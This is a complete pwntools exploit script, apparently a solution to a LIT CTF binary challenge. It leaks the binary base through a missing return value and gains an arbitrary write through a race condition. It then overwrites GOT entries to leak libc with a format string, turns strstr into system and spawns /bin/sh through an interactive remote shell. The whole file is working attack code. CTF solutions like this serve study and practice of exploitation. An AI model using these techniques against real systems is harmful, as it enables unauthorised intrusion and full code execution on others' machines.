#!/usr/bin/env python3
from pwn import *
from time import sleep
from tqdm import tqdm

e = ELF("main")
libc = ELF("libc-2.31.so")

context.binary = e

def conn():
	if args.REMOTE:
		return remote("litctf.org", 31773)
	elif args.GDB:
		#return gdb.debug(e.path, "b *(loseFuse + 169)\nb *(loseFuse + 188)\nb *(loseFuse + 284)\nc")
		return gdb.debug(e.path, "b *(loseFuse + 435)\nc")
	else:
		return process(e.path)




def arbitraryWrite(r, at, content):
	r.sendlineafter(b'> ', b'3')
	
	# race condition
	for i in tqdm(range(10)):
		sleep(1)
	
	r.recv()
	r.send(p64(at))
	r.sendlineafter(b'gravestone: ', b'asdf')
	r.sendlineafter(b'gravestone: ', content)

if __name__ == '__main__':
	r = conn()
	r.sendlineafter(b'> ', b'9')
	r.sendlineafter(b'minigame?\n', b'TIL')
	r.sendlineafter(b'> ', b'8')
	r.recvuntil(b'score: ')
	
	# the considerProposal function doesn't have a catch-all return value
	# resulting in a leak
	myProposalAddress = int(r.recvlineS(keepends=False))
	
	log.success(f"Proposal address @ {hex(myProposalAddress)}")
	
	e.address = myProposalAddress - e.sym['newMinigame']
	log.success(f"Binary address @ {hex(e.address)}")
	assert e.address & 0xfff == 0
	
	# so we can survive the LIT fuse
	arbitraryWrite(r, e.got['exit'], p64(e.sym['main']) + p64(e.address + 0x1190)[:6])
	
	# to leak the libc
	arbitraryWrite(r, e.got['strstr'], p64(e.sym['printf']) + p64(e.address + 0x11b0)[:6])
	
	# get leaks with printf
	r.sendlineafter(b'> ', b'9')
	r.sendlineafter(b'minigame?\n', b'%266$p\n')
	r.recvuntil(b'proposal.\n')
	
	ngl = 0x7f9ed31e64a0 - 0x00007f9ed2ff9000  # _nl_global_locale
	libc.address = int(r.recvlineS(keepends=False), 16) - ngl
	
	log.success(f"Libc address @ {hex(libc.address)}")
	assert libc.address & 0xfff == 0
	
	# turn strstr into system
	arbitraryWrite(r, e.got['strstr'], p64(libc.sym['system']))
	
	# now, strstr = system. Send a "proposal"
	r.sendlineafter(b'> ', b'9')
	r.sendlineafter(b'minigame?\n', b'/bin/sh')
	
	
	# shell achieved!
	r.interactive()
